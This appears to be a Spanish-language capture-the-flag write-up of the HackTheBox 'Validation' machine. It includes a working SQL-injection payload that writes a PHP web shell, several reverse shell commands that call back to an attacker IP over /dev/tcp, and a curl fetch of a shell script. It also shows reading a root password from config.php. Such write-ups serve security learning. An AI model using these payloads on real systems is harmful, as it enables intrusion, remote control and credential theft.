<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Validation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Validation</h1><br/><p><ol><li>Realizo un escaneo de puertos</li><li>Encuentro el servicio SSH y el servicio HTTP</li><li>Entro en la página web</li><li>Veo que hay un tb en el que se pueden introducir datos y un un botón para realizar un solicitud POST (probablemente)</li><li>Compruebo si este tb lo puedo usar para hacer SQLI o Code Injection</li><li>Para realizar este tipo de pruebas me gusta usar Burpsuite para ver que me devuelve la página web</li><li>Se almacenan los datos que introducimos en el tb</li><li>Uso una sqli para spawnear una shell de cmd (injección sql que crea un php web shell a través de la query) <strong>&#39; union select &quot;&lt;?php SYSTEM($_GET[&#39;cmd&#39;]) ?&gt;&quot; INTO OUTFILE &#39;/var/www/html/shell.php&#39;-- -</strong></li></ol></p><p>  <img src="images/22-1.png" alt="images/22-1.png" /><ol><li>Ahora me toca obtener persistencia</li><li>Para ello le enviaré un reverse shell</li><li>Creo el reverse shell <strong>echo &quot;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&quot;&gt;reverse.sh</strong></li><li>Monto el server para coger el archivo <strong>python3 -m http.server 4321</strong></li><li>Hago el curl para coger el archivo <strong>10.10.11.116/shell.php?cmd=curl+&lt;IP&gt;:&lt;PORT&gt;/reverse.sh &gt; reverse.sh</strong></li><li>Para ver que se descargó el archivo hacemos un ls <strong>10.10.11.116/shell.php?cmd=ls</strong></li><li>No me funciona</li><li> A través de la consola cmd spwaneao una reverse shell <strong>/shell.php?cmd=bash+-c+&#39;bash+-i+&gt;%26+/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;+0&gt;%261&#39;</strong></li><li>Encuentro la flag de user <strong>cat /home/htb/user.txt</strong></li><li>Hago sudo-l pero no encuentro nada</li><li>Hay un archivo config.php</li><li>Le realizo un cat y encuentro una pass  </li></ol><img src="images/22-2.png" alt="images/22-2.png" /><ol><li>Pruebo a ver si es la contraseña de root</li><li>Funciona </li></ol><img src="images/22-3.png" alt="images/22-3.png" /><ol><li>Encuentro la flag root.txt</li></ol></p><p align="center"></p></div>
</body>
</html>
